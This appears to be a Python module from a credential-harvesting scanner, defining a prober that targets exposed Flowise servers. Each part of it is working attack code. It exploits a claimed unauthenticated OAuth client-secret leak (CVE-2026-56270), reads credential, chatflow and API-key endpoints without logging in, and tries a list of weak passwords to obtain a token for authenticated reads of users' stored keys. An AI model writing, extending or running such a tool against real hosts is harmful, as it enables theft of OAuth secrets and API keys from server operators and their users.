"""Flowise prober — OAuth secrets + credential component leaks.

Unauthenticated endpoints (CVE-2026-56270, Flowise < 3.1.0):
  - GET /api/v1/loginmethod?organizationId=<org> → leaks OAuth client secrets
    for Google/Azure/GitHub/Auth0 integrations.

Weak-password login → read:
  - POST /api/v1/auth/login → get JWT
  - GET /api/v1/credentials → component credentials (API keys stored by users)
  - GET /api/v1/chatflows → flow configs that may embed keys inline
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import WEAK_CREDENTIALS, Prober

log = logging.getLogger(__name__)


class FlowiseProber(Prober):
    product_name = "flowise"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "flowise" in blob or "flowiseai" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        # 1. Unauthenticated OAuth secrets disclosure (CVE-2026-56270)
        # Try common organizationId values — many instances use default "1" or "".
        for org_id in ("", "1", "default"):
            url = self._url(hit, "/api/v1/loginmethod")
            params = {"organizationId": org_id} if org_id else {}
            resp = await self._get(url, params=params)
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                found = self._extract_from_response(resp, hit, "flowise_loginmethod")
                if found:
                    creds.extend(found)
                    break  # got it, no need to try more org IDs

        # 2. Unauthenticated credential/component read (misconfigured instances)
        for path in ("/api/v1/credentials", "/api/v1/chatflows", "/api/v1/apikeys"):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"flowise_unauth_{path.split('/')[-1]}")
            creds.extend(found)

        # 3. Weak-password login → authenticated reads
        token = await self._try_login(hit) if self._intrusive_authorized(hit) else ""
        if token:
            for path in ("/api/v1/credentials", "/api/v1/chatflows", "/api/v1/apikeys"):
                resp = await self._get(
                    self._url(hit, path),
                    headers={"Authorization": f"Bearer {token}"},
                )
                found = self._extract_from_response(
                    resp, hit, f"flowise_authed_{path.split('/')[-1]}"
                )
                creds.extend(found)

        return creds

    async def _try_login(self, hit: dict[str, Any]) -> str:
        url = self._url(hit, "/api/v1/auth/login")
        if not url:
            return ""
        for username, password in WEAK_CREDENTIALS:
            resp = await self._post(url, json={"username": username, "password": password})
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except ValueError:
                continue
            token = data.get("token") or data.get("access_token") or ""
            if token:
                log.debug(
                    "flowise login success on %s with user %s",
                    hit.get("host", ""),
                    username,
                )
                return token
        return ""
